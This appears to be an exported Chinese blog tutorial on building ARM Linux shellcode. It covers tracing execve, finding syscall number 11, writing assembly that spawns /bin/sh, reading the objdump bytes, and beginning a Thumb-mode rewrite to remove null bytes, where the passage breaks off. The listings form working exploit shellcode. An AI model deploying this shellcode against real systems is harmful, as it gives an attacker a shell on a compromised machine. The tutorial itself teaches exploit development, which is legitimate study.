-&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt;   &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#1&lt;/span&gt;      &lt;span class=&#34;comment&#34;&gt;@ fd 1 = STDOUT&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt;   &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, string  &lt;span class=&#34;comment&#34;&gt;@ loading the string from memory to R1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt;   &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#13&lt;/span&gt;     &lt;span class=&#34;comment&#34;&gt;@ write 13 bytes to STDOUT &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt;   &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#4&lt;/span&gt;      &lt;span class=&#34;comment&#34;&gt;@ Syscall 0x4 = write()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;h3 id=&#34;1-trace-system-call&#34;&gt;&lt;a href=&#34;#1-trace-system-call&#34; class=&#34;headerlink&#34; title=&#34;1.trace system call&#34;&gt;&lt;/a&gt;1.trace system call&lt;/h3&gt;&lt;p&gt;使用下面的简单例程，然后把它转化成汇编代码：&lt;/p&gt;
-&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    system(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;strace -f -v &amp;lt;filename&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;execve(&amp;quot;/usr/bin/test&amp;quot;, [&amp;quot;test&amp;quot;], [...]) = 0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;h3 id=&#34;2-system-call-number-and-parameters&#34;&gt;&lt;a href=&#34;#2-system-call-number-and-parameters&#34; class=&#34;headerlink&#34; title=&#34;2.system call number and parameters&#34;&gt;&lt;/a&gt;2.system call number and parameters&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;NAME&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    execve - execute program&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SYNOPSIS&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;meta-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;meta-string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;  &lt;span class=&#34;title&#34;&gt;execve&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;char&lt;/span&gt; *filename, &lt;span class=&#34;keyword&#34;&gt;char&lt;/span&gt; *&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; argv [], &lt;span class=&#34;keyword&#34;&gt;char&lt;/span&gt; *&lt;span class=&#34;keyword&#34;&gt;const&lt;/span&gt; envp[])&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;=&amp;gt; &lt;span class=&#34;number&#34;&gt;0x000264d0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;push&lt;/span&gt; &amp;#123;&lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;lr&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264d4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264d8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264dc&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;cmn&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#4096&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;; 0x1000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264e0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264e4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;bhi&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x264f0&lt;/span&gt; &amp;lt;execve+&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264e8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264ec&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;28&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;pop&lt;/span&gt; &amp;#123;&lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264f0&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#20&lt;/span&gt;] &lt;span class=&#34;comment&#34;&gt;; 0x2650c &amp;lt;execve+60&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264f4&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;36&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;rsb&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264f8&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;ldr&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x000264fc&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;44&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;bl&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x11520&lt;/span&gt; &amp;lt;__aeabi_read_tp&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x00026500&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;mvn&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x00026504&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;52&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, [&lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x00026508&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;56&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x264e8&lt;/span&gt; &amp;lt;execve+&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;0x0002650c&lt;/span&gt; &amp;lt;+&lt;span class=&#34;number&#34;&gt;60&lt;/span&gt;&amp;gt;: &lt;span class=&#34;keyword&#34;&gt;andeq&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;asr&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;#31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;syscall为11&lt;/p&gt;
-&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.section&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;.text&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.global&lt;/span&gt; _start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;_start:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.ascii&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh\0&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;execve:&lt;/span&gt;     file format elf32-littlearm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;Disassembly&lt;/span&gt; of section &lt;span class=&#34;meta&#34;&gt;.text&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00010054&lt;/span&gt; &amp;lt;_start&amp;gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10054&lt;/span&gt;: e28f000c &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10058&lt;/span&gt;: e3a01000 &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;1005&lt;/span&gt;c: e3a02000 &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10060&lt;/span&gt;: e3a0700b &lt;span class=&#34;keyword&#34;&gt;mov&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r7&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;#11&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10064&lt;/span&gt;: ef000000 &lt;span class=&#34;keyword&#34;&gt;svc&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;10068&lt;/span&gt;: &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;e69622f &lt;span class=&#34;meta&#34;&gt;.word&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x6e69622f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;number&#34;&gt;1006&lt;/span&gt;c: &lt;span class=&#34;number&#34;&gt;0068732&lt;/span&gt;f &lt;span class=&#34;meta&#34;&gt;.word&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x0068732f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-
-&lt;p&gt;还是有很多NULL字符在里头的。&lt;/p&gt;
-&lt;h3 id=&#34;3-去除NULL字符数据&#34;&gt;&lt;a href=&#34;#3-去除NULL字符数据&#34; class=&#34;headerlink&#34; title=&#34;3. 去除NULL字符数据&#34;&gt;&lt;/a&gt;3. 去除NULL字符数据&lt;/h3&gt;&lt;p&gt;我们可以用来减少空字节出现在shell代码中的一种技术是使用拇指模式。使用拇指模式可以减少空字节的机会，因为拇指指令长2字节，而不是4字节。&lt;/p&gt;
-&lt;figure class=&#34;highlight arm&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.section&lt;/span&gt; &lt;span class=&#34;meta&#34;&gt;.text&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;.global&lt;/span&gt; _start&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;symbol&#34;&gt;_start:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;meta&#34;&gt;.code&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;add&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;r3&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;pc&lt;/span&gt;, &lt;span 